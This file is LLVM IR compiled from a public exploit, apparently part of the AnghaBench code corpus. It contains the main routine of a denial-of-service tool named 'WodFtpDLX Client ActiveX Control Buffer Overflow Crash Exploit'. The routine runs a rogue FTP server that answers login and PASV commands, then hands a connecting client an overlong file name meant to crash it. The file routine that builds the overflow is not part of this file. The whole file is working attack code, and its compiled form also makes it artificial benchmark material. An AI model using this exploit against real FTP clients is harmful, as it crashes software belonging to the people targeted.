; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_649.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_649.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [81 x i8] c"------------------------------------------------------------------------------\0D\0A\00", align 1
@.str.1 = private unnamed_addr constant [65 x i8] c"WodFtpDLX Client ActiveX Control Buffer Overflow Crash Exploit\0D\0A\00", align 1
@.str.2 = private unnamed_addr constant [26 x i8] c"\09\09\09created by Komrade\0D\0A\0D\0A\00", align 1
@.str.3 = private unnamed_addr constant [43 x i8] c"\09\09e-mail: unsecure(at)altervista(dot)org\0D\0A\00", align 1
@.str.4 = private unnamed_addr constant [40 x i8] c"\09\09web: http://unsecure.altervista.org\0D\0A\00", align 1
@.str.5 = private unnamed_addr constant [83 x i8] c"------------------------------------------------------------------------------\0D\0A\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [3 x i8] c"-l\00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"-r\00", align 1
@.str.8 = private unnamed_addr constant [43 x i8] c"Usage: WodFtpCrash [-l] [-r server IP]\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [11 x i8] c"Options:\0D\0A\00", align 1
@.str.10 = private unnamed_addr constant [25 x i8] c" -l\09\09executed locally.\0D\0A\00", align 1
@.str.11 = private unnamed_addr constant [74 x i8] c" -r server IP\09executed remotely. You need to specify the address of the\0D\0A\00", align 1
@.str.12 = private unnamed_addr constant [61 x i8] c"\09\09FTP server for the PASV command (Insert your IP address)\0D\0A\00", align 1
@.str.13 = private unnamed_addr constant [14 x i8] c"\0D\0AExamples:\0D\0A\00", align 1
@.str.14 = private unnamed_addr constant [37 x i8] c" wodftpcrash -l\09\09\09executed locally\0D\0A\00", align 1
@.str.15 = private unnamed_addr constant [45 x i8] c" wodftpCrash -r 10.0.0.1\09executed remotely\0D\0A\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.17 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.18 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.19 = private unnamed_addr constant [11 x i8] c"127,0,0,1,\00", align 1
@PF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@FTP_PORT = common dso_local global i32 0, align 4
@INADDR_ANY = common dso_local global i32 0, align 4
@.str.20 = private unnamed_addr constant [38 x i8] c"Error in bind(). Port may be in use\0D\0A\00", align 1
@.str.21 = private unnamed_addr constant [20 x i8] c"Error in listen()\0D\0A\00", align 1
@.str.22 = private unnamed_addr constant [54 x i8] c"Opening the FTP port and waiting for connections...\0D\0A\00", align 1
@.str.23 = private unnamed_addr constant [33 x i8] c"Client connected from IP: %s\0D\0A\0D\0A\00", align 1
@.str.24 = private unnamed_addr constant [46 x i8] c"220 WodFtpDlx ActiveX Control Crash Exploit\0D\0A\00", align 1
@.str.25 = private unnamed_addr constant [18 x i8] c"Error in send()\0D\0A\00", align 1
@wait = common dso_local global i64 0, align 8
@TRUE = common dso_local global i64 0, align 8
@.str.26 = private unnamed_addr constant [18 x i8] c"Error in recv()\0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [11 x i8] c"CLIENT: %s\00", align 1
@.str.28 = private unnamed_addr constant [5 x i8] c"USER\00", align 1
@.str.29 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.30 = private unnamed_addr constant [47 x i8] c"331 Anonymous access allowed, send password.\0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [5 x i8] c"PASS\00", align 1
@.str.32 = private unnamed_addr constant [32 x i8] c"230 Anonymous user logged in.\0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [6 x i8] c"PWD\0D\0A\00", align 1
@.str.34 = private unnamed_addr constant [32 x i8] c"257 \22/\22 is current directory.\0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [4 x i8] c"CWD\00", align 1
@.str.36 = private unnamed_addr constant [5 x i8] c"TYPE\00", align 1
@.str.37 = private unnamed_addr constant [21 x i8] c"200 Type set to A.\0D\0A\00", align 1
@.str.38 = private unnamed_addr constant [7 x i8] c"PASV\0D\0A\00", align 1
@fileList = common dso_local global i32 0, align 4
@.str.39 = private unnamed_addr constant [27 x i8] c"Error in CreateThread() %d\00", align 1
@.str.40 = private unnamed_addr constant [38 x i8] c"227 Entering Passive Mode (%s4,82).\0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [5 x i8] c"LIST\00", align 1
@.str.42 = private unnamed_addr constant [7 x i8] c"LIST\0D\0A\00", align 1
@.str.43 = private unnamed_addr constant [55 x i8] c"125 Data connection already open; Transfer starting.\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [13 x i8] c"SERVER: %s\0D\0A\00", align 1
@FALSE = common dso_local global i64 0, align 8
@STILL_ACTIVE = common dso_local global i64 0, align 8
@.str.45 = private unnamed_addr constant [38 x i8] c"< Long file name sent to client >\0D\0A\0D\0A\00", align 1
@.str.46 = private unnamed_addr constant [25 x i8] c"226 Transfer complete.\0D\0A\00", align 1
@.str.47 = private unnamed_addr constant [20 x i8] c"550 Unimplemented\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [12 x i8] c"Wait.......\00", align 1
@.str.49 = private unnamed_addr constant [28 x i8] c"Exploit succesfully sent!\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca [4096 x i8], align 16
  %13 = alloca [512 x i8], align 16
  %14 = alloca [32 x i8], align 16
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32*, align 8
  %20 = alloca i64, align 8
  %21 = alloca i64, align 8
  %22 = alloca [4 x i8*], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str, i64 0, i64 0))
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.1, i64 0, i64 0))
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0))
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.3, i64 0, i64 0))
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.4, i64 0, i64 0))
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.5, i64 0, i64 0))
  %29 = load i32, i32* %4, align 4
  %30 = icmp ne i32 %29, 2
  br i1 %30, label %37, label %31

31:                                               ; preds = %2
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 1
  %34 = load i8*, i8** %33, align 8
  %35 = call i64 @strcmp(i8* %34, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0))
  %36 = icmp ne i64 %35, 0
  br i1 %36, label %37, label %55

37:                                               ; preds = %31, %2
  %38 = load i32, i32* %4, align 4
  %39 = icmp ne i32 %38, 3
  br i1 %39, label %46, label %40

40:                                               ; preds = %37
  %41 = load i8**, i8*** %5, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 1
  %43 = load i8*, i8** %42, align 8
  %44 = call i64 @strcmp(i8* %43, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0))
  %45 = icmp ne i64 %44, 0
  br i1 %45, label %46, label %55

46:                                               ; preds = %40, %37
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.8, i64 0, i64 0))
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.9, i64 0, i64 0))
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.10, i64 0, i64 0))
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.11, i64 0, i64 0))
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.12, i64 0, i64 0))
  %52 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.13, i64 0, i64 0))
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.14, i64 0, i64 0))
  %54 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.15, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %300

55:                                               ; preds = %40, %31
  %56 = load i8**, i8*** %5, align 8
  %57 = getelementptr inbounds i8*, i8** %56, i64 1
  %58 = load i8*, i8** %57, align 8
  %59 = call i64 @strcmp(i8* %58, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0))
  %60 = icmp eq i64 %59, 0
  br i1 %60, label %61, label %105

61:                                               ; preds = %55
  %62 = load i8**, i8*** %5, align 8
  %63 = getelementptr inbounds i8*, i8** %62, i64 2
  %64 = load i8*, i8** %63, align 8
  %65 = call i8* @strtok(i8* %64, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i64 0, i64 0))
  %66 = getelementptr inbounds [4 x i8*], [4 x i8*]* %22, i64 0, i64 0
  store i8* %65, i8** %66, align 16
  store i32 1, i32* %17, align 4
  br label %67

67:                                               ; preds = %75, %61
  %68 = load i32, i32* %17, align 4
  %69 = icmp slt i32 %68, 4
  br i1 %69, label %70, label %78

70:                                               ; preds = %67
  %71 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i64 0, i64 0))
  %72 = load i32, i32* %17, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds [4 x i8*], [4 x i8*]* %22, i64 0, i64 %73
  store i8* %71, i8** %74, align 8
  br label %75

75:                                               ; preds = %70
  %76 = load i32, i32* %17, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %17, align 4
  br label %67

78:                                               ; preds = %67
  %79 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i64 0, i64 0
  %80 = call i32 @strcpy(i8* %79, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.17, i64 0, i64 0))
  store i32 0, i32* %17, align 4
  br label %81

81:                                               ; preds = %101, %78
  %82 = load i32, i32* %17, align 4
  %83 = icmp slt i32 %82, 4
  br i1 %83, label %84, label %90

84:                                               ; preds = %81
  %85 = load i32, i32* %17, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds [4 x i8*], [4 x i8*]* %22, i64 0, i64 %86
  %88 = load i8*, i8** %87, align 8
  %89 = icmp ne i8* %88, null
  br label %90

90:                                               ; preds = %84, %81
  %91 = phi i1 [ false, %81 ], [ %89, %84 ]
  br i1 %91, label %92, label %104

92:                                               ; preds = %90
  %93 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i64 0, i64 0
  %94 = load i32, i32* %17, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds [4 x i8*], [4 x i8*]* %22, i64 0, i64 %95
  %97 = load i8*, i8** %96, align 8
  %98 = call i32 @strlcat(i8* %93, i8* %97, i32 16)
  %99 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i64 0, i64 0
  %100 = call i32 @strcat(i8* %99, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.18, i64 0, i64 0))
  br label %101

101:                                              ; preds = %92
  %102 = load i32, i32* %17, align 4
  %103 = add nsw i32 %102, 1
  store i32 %103, i32* %17, align 4
  br label %81

104:                                              ; preds = %90
  br label %108

105:                                              ; preds = %55
  %106 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i64 0, i64 0
  %107 = call i32 @strcpy(i8* %106, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.19, i64 0, i64 0))
  br label %108

108:                                              ; preds = %105, %104
  %109 = call i32 @MAKEWORD(i32 2, i32 0)
  store i32 %109, i32* %11, align 4
  %110 = load i32, i32* %11, align 4
  %111 = call i32 @WSAStartup(i32 %110, i32* %10)
  %112 = load i32, i32* @PF_INET, align 4
  %113 = load i32, i32* @SOCK_STREAM, align 4
  %114 = call i32 @socket(i32 %112, i32 %113, i32 0)
  store i32 %114, i32* %6, align 4
  %115 = load i32, i32* @PF_INET, align 4
  %116 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  store i32 %115, i32* %116, align 4
  %117 = load i32, i32* @FTP_PORT, align 4
  %118 = call i32 @htons(i32 %117)
  %119 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i32 %118, i32* %119, align 4
  %120 = load i32, i32* @INADDR_ANY, align 4
  %121 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %122 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %121, i32 0, i32 0
  store i32 %120, i32* %122, align 4
  %123 = load i32, i32* %6, align 4
  %124 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %125 = call i32 @bind(i32 %123, %struct.sockaddr* %124, i32 12)
  store i32 %125, i32* %18, align 4
  %126 = load i32, i32* %18, align 4
  %127 = icmp slt i32 %126, 0
  br i1 %127, label %128, label %130

128:                                              ; preds = %108
  %129 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.20, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %300

130:                                              ; preds = %108
  %131 = load i32, i32* %6, align 4
  %132 = call i32 @listen(i32 %131, i32 1)
  store i32 %132, i32* %18, align 4
  %133 = load i32, i32* %18, align 4
  %134 = icmp slt i32 %133, 0
  br i1 %134, label %135, label %137

135:                                              ; preds = %130
  %136 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.21, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %300

137:                                              ; preds = %130
  store i32 4, i32* %15, align 4
  %138 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.22, i64 0, i64 0))
  %139 = load i32, i32* %6, align 4
  %140 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %141 = call i32 @accept(i32 %139, %struct.sockaddr* %140, i32* %15)
  store i32 %141, i32* %7, align 4
  %142 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  %143 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %142, i32 0, i32 0
  %144 = load i32, i32* %143, align 4
  %145 = call i8* @inet_ntoa(i32 %144)
  %146 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.23, i64 0, i64 0), i8* %145)
  %147 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i64 0, i64 0
  %148 = call i32 @strcpy(i8* %147, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.24, i64 0, i64 0))
  %149 = load i32, i32* %7, align 4
  %150 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i64 0, i64 0
  %151 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i64 0, i64 0
  %152 = call i32 @strlen(i8* %151)
  %153 = call i32 @send(i32 %149, i8* %150, i32 %152, i32 0)
  store i32 %153, i32* %16, align 4
  %154 = load i32, i32* %16, align 4
  %155 = icmp slt i32 %154, 0
  br i1 %155, label %156, label %158

156:                                              ; preds = %137
  %157 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.25, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %300

158:                                              ; preds = %137
  br label %159

159:                                              ; preds = %290, %158
  %160 = load i64, i64* @wait, align 8
  %161 = load i64, i64* @TRUE, align 8
  %162 = icmp eq i64 %160, %161
  br i1 %162, label %163, label %291

163:                                              ; preds = %159
  %164 = call i32 @Sleep(i32 800)
  %165 = load i32, i32* %7, align 4
  %166 = getelementptr inbounds [512 x i8], [512 x i8]* %13, i64 0, i64 0
  %167 = call i32 @recv(i32 %165, i8* %166, i32 4096, i32 0)
  store i32 %167, i32* %16, align 4
  %168 = load i32, i32* %16, align 4
  %169 = icmp slt i32 %168, 0
  br i1 %169, label %170, label %172

170:                                              ; preds = %163
  %171 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.26, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %300

172:                                              ; preds = %163
  %173 = load i32, i32* %16, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds [512 x i8], [512 x i8]* %13, i64 0, i64 %174
  store i8 0, i8* %175, align 1
  %176 = getelementptr inbounds [512 x i8], [512 x i8]* %13, i64 0, i64 0
  %177 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.27, i64 0, i64 0), i8* %176)
  %178 = getelementptr inbounds [512 x i8], [512 x i8]* %13, i64 0, i64 0
  %179 = call i8* @strtok(i8* %178, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.29, i64 0, i64 0))
  %180 = call i64 @stricmp(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i64 0, i64 0), i8* %179)
  %181 = icmp eq i64 %180, 0
  br i1 %181, label %182, label %185

182:                                              ; preds = %172
  %183 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i64 0, i64 0
  %184 = call i32 @strcpy(i8* %183, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.30, i64 0, i64 0))
  br label %278

185:                                              ; preds = %172
  %186 = getelementptr inbounds [512 x i8], [512 x i8]* %13, i64 0, i64 0
  %187 = call i8* @strtok(i8* %186, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.29, i64 0, i64 0))
  %188 = call i64 @stricmp(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.31, i64 0, i64 0), i8* %187)
  %189 = icmp eq i64 %188, 0
  br i1 %189, label %190, label %193

190:                                              ; preds = %185
  %191 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i64 0, i64 0
  %192 = call i32 @strcpy(i8* %191, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.32, i64 0, i64 0))
  br label %277

193:                                              ; preds = %185
  %194 = getelementptr inbounds [512 x i8], [512 x i8]* %13, i64 0, i64 0
  %195 = call i64 @stricmp(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.33, i64 0, i64 0), i8* %194)
  %196 = icmp eq i64 %195, 0
  br i1 %196, label %197, label %200

197:                                              ; preds = %193
  %198 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i64 0, i64 0
  %199 = call i32 @strcpy(i8* %198, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.34, i64 0, i64 0))
  br label %276

200:                                              ; preds = %193
  %201 = getelementptr inbounds [512 x i8], [512 x i8]* %13, i64 0, i64 0
  %202 = call i8* @strtok(i8* %201, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.29, i64 0, i64 0))
  %203 = call i64 @stricmp(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.35, i64 0, i64 0), i8* %202)
  %204 = icmp eq i64 %203, 0
  br i1 %204, label %205, label %208

205:                                              ; preds = %200
  %206 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i64 0, i64 0
  %207 = call i32 @strcpy(i8* %206, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.34, i64 0, i64 0))
  br label %275

208:                                              ; preds = %200
  %209 = getelementptr inbounds [512 x i8], [512 x i8]* %13, i64 0, i64 0
  %210 = call i8* @strtok(i8* %209, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.29, i64 0, i64 0))
  %211 = call i64 @stricmp(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0), i8* %210)
  %212 = icmp eq i64 %211, 0
  br i1 %212, label %213, label %216

213:                                              ; preds = %208
  %214 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i64 0, i64 0
  %215 = call i32 @strcpy(i8* %214, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.37, i64 0, i64 0))
  br label %274

216:                                              ; preds = %208
  %217 = getelementptr inbounds [512 x i8], [512 x i8]* %13, i64 0, i64 0
  %218 = call i64 @stricmp(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.38, i64 0, i64 0), i8* %217)
  %219 = icmp eq i64 %218, 0
  br i1 %219, label %220, label %232

220:                                              ; preds = %216
  %221 = load i32, i32* @fileList, align 4
  %222 = call i32* @CreateThread(i32* null, i32 0, i32 %221, i32* null, i32 0, i64* %20)
  store i32* %222, i32** %19, align 8
  %223 = load i32*, i32** %19, align 8
  %224 = icmp eq i32* %223, null
  br i1 %224, label %225, label %228

225:                                              ; preds = %220
  %226 = call i32 (...) @GetLastError()
  %227 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.39, i64 0, i64 0), i32 %226)
  br label %228

228:                                              ; preds = %225, %220
  %229 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i64 0, i64 0
  %230 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i64 0, i64 0
  %231 = call i32 @wsprintf(i8* %229, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.40, i64 0, i64 0), i8* %230)
  br label %273

232:                                              ; preds = %216
  %233 = getelementptr inbounds [512 x i8], [512 x i8]* %13, i64 0, i64 0
  %234 = call i8* @strtok(i8* %233, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.29, i64 0, i64 0))
  %235 = call i64 @stricmp(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.41, i64 0, i64 0), i8* %234)
  %236 = icmp eq i64 %235, 0
  br i1 %236, label %241, label %237

237:                                              ; preds = %232
  %238 = getelementptr inbounds [512 x i8], [512 x i8]* %13, i64 0, i64 0
  %239 = call i64 @stricmp(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.42, i64 0, i64 0), i8* %238)
  %240 = icmp eq i64 %239, 0
  br i1 %240, label %241, label %269

241:                                              ; preds = %237, %232
  %242 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i64 0, i64 0
  %243 = call i32 @strcpy(i8* %242, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.43, i64 0, i64 0))
  %244 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i64 0, i64 0
  %245 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.44, i64 0, i64 0), i8* %244)
  %246 = load i32, i32* %7, align 4
  %247 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i64 0, i64 0
  %248 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i64 0, i64 0
  %249 = call i32 @strlen(i8* %248)
  %250 = call i32 @send(i32 %246, i8* %247, i32 %249, i32 0)
  store i32 %250, i32* %16, align 4
  %251 = load i32, i32* %16, align 4
  %252 = icmp slt i32 %251, 0
  br i1 %252, label %253, label %255

253:                                              ; preds = %241
  %254 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.25, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %300

255:                                              ; preds = %241
  %256 = load i64, i64* @FALSE, align 8
  store i64 %256, i64* @wait, align 8
  br label %257

257:                                              ; preds = %261, %255
  %258 = load i32*, i32** %19, align 8
  %259 = call i32 @GetExitCodeThread(i32* %258, i64* %21)
  %260 = call i32 @Sleep(i32 100)
  br label %261

261:                                              ; preds = %257
  %262 = load i64, i64* %21, align 8
  %263 = load i64, i64* @STILL_ACTIVE, align 8
  %264 = icmp eq i64 %262, %263
  br i1 %264, label %257, label %265

265:                                              ; preds = %261
  %266 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.45, i64 0, i64 0))
  %267 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i64 0, i64 0
  %268 = call i32 @strcpy(i8* %267, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.46, i64 0, i64 0))
  br label %272

269:                                              ; preds = %237
  %270 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i64 0, i64 0
  %271 = call i32 @strcpy(i8* %270, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.47, i64 0, i64 0))
  br label %272

272:                                              ; preds = %269, %265
  br label %273

273:                                              ; preds = %272, %228
  br label %274

274:                                              ; preds = %273, %213
  br label %275

275:                                              ; preds = %274, %205
  br label %276

276:                                              ; preds = %275, %197
  br label %277

277:                                              ; preds = %276, %190
  br label %278

278:                                              ; preds = %277, %182
  %279 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i64 0, i64 0
  %280 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.44, i64 0, i64 0), i8* %279)
  %281 = load i32, i32* %7, align 4
  %282 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i64 0, i64 0
  %283 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i64 0, i64 0
  %284 = call i32 @strlen(i8* %283)
  %285 = call i32 @send(i32 %281, i8* %282, i32 %284, i32 0)
  store i32 %285, i32* %16, align 4
  %286 = load i32, i32* %16, align 4
  %287 = icmp slt i32 %286, 0
  br i1 %287, label %288, label %290

288:                                              ; preds = %278
  %289 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.25, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %300

290:                                              ; preds = %278
  br label %159

291:                                              ; preds = %159
  %292 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.48, i64 0, i64 0))
  %293 = call i32 @Sleep(i32 2000)
  %294 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.49, i64 0, i64 0))
  %295 = load i32, i32* %7, align 4
  %296 = call i32 @closesocket(i32 %295)
  %297 = load i32, i32* %6, align 4
  %298 = call i32 @closesocket(i32 %297)
  %299 = call i32 (...) @WSACleanup()
  store i32 0, i32* %3, align 4
  br label %300

300:                                              ; preds = %291, %288, %253, %170, %156, %135, %128, %46
  %301 = load i32, i32* %3, align 4
  ret i32 %301
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @strcmp(i8*, i8*) #1

declare dso_local i8* @strtok(i8*, i8*) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strlcat(i8*, i8*, i32) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @MAKEWORD(i32, i32) #1

declare dso_local i32 @WSAStartup(i32, i32*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @listen(i32, i32) #1

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i8* @inet_ntoa(i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @Sleep(i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i64 @stricmp(i8*, i8*) #1

declare dso_local i32* @CreateThread(i32*, i32, i32, i32*, i32, i64*) #1

declare dso_local i32 @GetLastError(...) #1

declare dso_local i32 @wsprintf(i8*, i8*, i8*) #1

declare dso_local i32 @GetExitCodeThread(i32*, i64*) #1

declare dso_local i32 @closesocket(i32) #1

declare dso_local i32 @WSACleanup(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
